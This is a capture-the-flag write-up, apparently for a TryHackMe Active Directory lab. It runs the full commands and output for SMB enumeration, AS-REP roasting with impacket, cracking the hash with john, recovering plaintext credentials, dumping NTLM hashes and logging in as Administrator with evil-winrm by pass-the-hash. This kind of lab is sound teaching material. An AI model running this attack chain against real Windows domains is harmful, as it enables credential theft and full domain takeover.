TTL -> 127 So, it is windows machine.

# NMAP

```bash

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2021-05-31 03:24:30Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         syn-ack Microsoft Windows RPC
49711/tcp open  msrpc         syn-ack Microsoft Windows RPC
49737/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -5h29m50s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 25670/tcp): CLEAN (Timeout)
|   Check 2 (port 32295/tcp): CLEAN (Timeout)
|   Check 3 (port 65213/udp): CLEAN (Timeout)
|   Check 4 (port 5763/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-05-31T03:25:30
|_  start_date: N/A
```

# Enumeration

1. SMB 

--> crackmapexec

```bash
crackmapexec smb 10.10.122.236
SMB         10.10.122.236   445    WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
```

**Domain: vulnnet-rst.local**

--> smbclient

```bash

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing
```
--> Users

```bash
Alexa
Jack
Tony
Johnny
```

Users Gathering

```bash
python3 /opt/impacket/examples/lookupsid.py anonymous@10.10.122.236 > users
```

```bash
cat users | cut -d ' ' -f 2 | cut -d '\' -f 2 > users.txt
```

```bash
for user in $(cat ~/tryhackme/Roasted/users.txt); do python3 GetNPUsers.py vulnnet-rst.local/$user -dc-ip 10.10.122.236 -no-pass;done
```

![image](https://user-images.githubusercontent.com/68326057/120137689-7c80e300-c1f2-11eb-91b9-d0b3d53506d0.png)

```bash
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:1ab406d82031df8f7b26b66f69cf5bef$8c55e42e53a865143224e902b77e13d8928d197b9663c44970e3e558808a4ee1db5e46dff8fad6b18abf5e6ceccfcfcafde206fd8512cea75ea507a4c025201a3a60b8383802e8af01e01400b52fb8f2bcbb355e2c21445cde499cc848c89a0dfbbe1c0eeaf86ea8301efb1ffa1130e4951f71bfd849952162d95b478aa55092e926eb8c51a2a94f5aeb5307275c8a2baa008a23a67d222d3aacd4eba2a5f7298c739032ee156a68fe4dad082754dfee6646cb6a7cc198830e1ce426c09ef1f4102d6249addd211ac77e75aee95cad45d41b0fdc9463b89a1b0fc2462927740651c074a6e9e3cd84bd00e1b4d26e3a2be5c93cd0445d
```

![image](https://user-images.githubusercontent.com/68326057/120137825-c79af600-c1f2-11eb-9e35-4a27a8c5d901.png)


```bash
john --wordlist=../../rockyou.txt  hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tj072889*        ($krb5asrep$23$t-skid@VULNNET-RST.LOCAL)
1g 0:00:00:05 DONE (2021-05-31 15:00) 0.1908g/s 606583p/s 606583c/s 606583C/s tjallen99..tj02091987
Use the "--s
```

Creds:-
```bash
t-skid:tj072889*
```

```bash

smbclient -U t-skid \\\\10.10.122.236\\NETLOGON 
Enter WORKGROUP\t-skid's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Mar 17 04:45:49 2021
  ..                                  D        0  Wed Mar 17 04:45:49 2021
  ResetPassword.vbs                   A     2821  Wed Mar 17 04:48:14 2021

                8771839 blocks of size 4096. 4554883 blocks available
smb: \> 
```

![image](https://user-images.githubusercontent.com/68326057/120139149-7dffda80-c1f5-11eb-9cdd-3c1a2eed4a57.png)


Creds:-
```bash
a-whitehat:bNdKVkjv3RR9ht
```

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

```bash
evil-winrm -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d -i 10.10.86.221
```

![image](https://user-images.githubusercontent.com/68326057/120141490-36c81880-c1fa-11eb-81f9-ceb9ca03efdb.png)

![image](https://user-images.githubusercontent.com/68326057/120141579-624b0300-c1fa-11eb-82c1-932004c7f216.png)



